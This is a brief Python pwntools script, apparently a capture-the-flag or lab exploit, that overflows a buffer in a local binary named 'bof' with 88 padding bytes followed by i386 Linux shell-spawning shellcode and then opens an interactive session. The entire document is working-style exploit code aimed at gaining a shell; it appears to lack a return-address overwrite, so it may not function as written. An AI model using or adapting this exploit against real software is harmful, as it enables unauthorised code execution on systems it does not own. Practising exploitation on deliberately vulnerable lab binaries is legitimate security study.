from pwn import *

context.log_level = "DEBUG"
context.arch = 'i386'
context.terminal = ['tmux', 'splitw', '-h']

p = process("./bof")
e = ELF("./bof")

payload = b"A"*88
sh = shellcraft.i386.linux.sh()
payload += sh
p.sendline(payload)
p.interactive()